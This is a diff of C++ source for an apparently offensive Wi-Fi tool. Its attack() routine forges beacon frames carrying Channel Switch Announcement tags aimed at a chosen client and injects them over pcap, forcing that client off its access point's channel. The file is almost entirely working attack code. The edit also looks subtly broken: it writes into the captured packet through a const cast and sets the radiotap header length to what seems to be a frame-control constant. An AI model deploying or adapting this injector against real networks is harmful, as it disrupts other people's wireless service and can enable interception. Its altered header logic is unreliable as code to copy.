@@ -1,4 +1,5 @@
 #include "pch.h"
+#include "radiotap.h"
 #include "csa.h"
 
 CsaPkt::CsaPkt(pcap_t* pcap, const Mac& apMac, const Mac& stMac)
@@ -58,8 +59,14 @@ std::vector<uint8_t> CsaPkt::buildTagsWithCsa(const uint8_t* tagsStart, const ui
     return tags;
 }
 
-std::vector<uint8_t> CsaPkt::buildModifiedBeacon(const uint8_t* pkt, uint32_t capLen, uint16_t rtLen, uint8_t targetCh) {
-    PDot11BeaconHdr beacon = (PDot11BeaconHdr)(pkt + rtLen);
+std::vector<uint8_t> CsaPkt::buildModifiedBeacon(const uint8_t* pkt, uint32_t capLen, uint8_t targetCh) {
+    // create minimal rt header
+    PRadioTapHdr newRt = (PRadioTapHdr)pkt;
+    newRt->version_ = 0;
+    newRt->pad_ = 0;
+    newRt->len_ = FC_BEACON;
+
+    PDot11BeaconHdr beacon = (PDot11BeaconHdr)(pkt + newRt->len_);
 
     const uint8_t* tagsStart = (const uint8_t*)(beacon + 1);
     const uint8_t* tagsEnd = pkt + capLen;
@@ -67,8 +74,8 @@ std::vector<uint8_t> CsaPkt::buildModifiedBeacon(const uint8_t* pkt, uint32_t ca
 
     std::vector<uint8_t> tags = buildTagsWithCsa(tagsStart, tagsEnd, targetCh);
 
-    std::vector<uint8_t> newPkt(pkt, pkt + rtLen + sizeof(Dot11BeaconHdr));
-    PDot11BeaconHdr newBeacon = (PDot11BeaconHdr)(newPkt.data() + rtLen);
+    std::vector<uint8_t> newPkt(pkt, pkt + newRt->len_ + sizeof(Dot11BeaconHdr));
+    PDot11BeaconHdr newBeacon = (PDot11BeaconHdr)(newPkt.data() + newRt->len_);
     newBeacon->addr1_ = stMac_;     // addr1 : receiverAddress
 
     newPkt.insert(newPkt.end(), tags.begin(), tags.end());
@@ -100,7 +107,7 @@ std::vector<uint8_t> CsaPkt::processBeacon(const uint8_t* pkt, uint32_t capLen) 
 
     uint8_t base = (csaNewCh != 0) ? csaNewCh : curCh_;
     lastTargetch_ = pickTargetChannel(base);
-    return buildModifiedBeacon(pkt, capLen, rtLen, lastTargetch_);
+    return buildModifiedBeacon(pkt, capLen, lastTargetch_);
 }
 
 void CsaPkt::attack() {
@@ -117,7 +124,6 @@ void CsaPkt::attack() {
         std::vector<uint8_t> newPkt = processBeacon(raw, hdr->caplen);
         if (newPkt.empty()) continue;
 
-        printf("size : %lu\n", newPkt.size());
         if (pcap_inject(pcap_, newPkt.data(), newPkt.size()) < 0) {
             fprintf(stderr, "pcap_inject failed: %s\n", pcap_geterr(pcap_));
             break;
